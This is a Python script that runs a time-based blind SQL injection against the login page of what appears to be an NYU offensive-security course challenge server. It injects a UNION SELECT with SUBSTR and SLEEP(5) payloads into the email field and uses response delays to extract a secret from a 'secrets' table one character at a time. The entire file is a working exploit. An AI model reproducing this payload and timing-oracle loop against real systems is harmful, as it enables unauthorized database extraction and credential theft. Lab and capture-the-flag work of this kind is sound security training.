import requests
import time

characters = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 
           'V', 'W', 'X', 'Y', 'Z', '_', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 
           'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
           '{', '}']

i=1
leaked_string = ''
index = 0 
elapsed_time = 10

while True:
  cookies = {
      'CHALBROKER_USER_ID': 'aga8870',
  }

  headers = {
      'Host': 'offsec-chalbroker.osiris.cyber.nyu.edu:1241',
      'Cache-Control': 'max-age=0',
      'Upgrade-Insecure-Requests': '1',
      'Origin': 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1241',
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Referer': 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'close',
  }

  string = "admin' UNION SELECT IF(SUBSTR((SELECT VALUE FROM secrets LIMIT 1 OFFSET 0), {}, 1) = BINARY '{}' , SLEEP(5), 0), 2, 3; -- ".format(i, characters[index])
  data = {
      'email': string,
      'password': 'p',
  }

  params=''

  current_time = time.time()
  response = requests.post(
      'http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php',
      params=params,
      cookies=cookies,
      headers=headers,
      data=data,
      verify=False,
  )
  elapsed_time = time.time() - current_time

  if (elapsed_time < 4):
    index +=1
    print("this")
  else:
    leaked_string = leaked_string + characters[index]
    print(leaked_string)
    index = 0
    i+=1
  if index > 64:
    print("huh")
    break

print(leaked_string)